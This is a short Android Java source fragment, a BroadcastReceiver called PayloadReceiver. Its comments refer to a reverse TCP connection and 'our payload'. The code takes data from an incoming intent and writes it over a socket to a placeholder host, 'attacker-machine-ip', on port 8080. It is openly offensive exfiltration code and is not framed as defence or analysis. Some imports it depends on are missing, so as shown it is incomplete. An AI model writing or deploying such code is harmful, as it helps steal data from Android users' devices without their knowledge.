
import android.content.BroadcastReceiver;

import android.content.Context;

import android.content.Intent;



public class PayloadReceiver extends BroadcastReceiver {

@Override

public void onReceive(Context context, Intent intent) {

// Receive data over the reverse TCP connection

String receivedData = intent.getStringExtra("RECEIVED_DATA");



// Send data to our payload

try {

Socket socket = new Socket("attacker-machine-ip", 8080);

OutputStream outputStream = socket.getOutputStream();

outputStream.write(receivedData.getBytes());

socket.close();

} catch (IOException e) {

Log.e("PayloadReceiver", "Error sending data: " + e.getMessage());

}

}

}

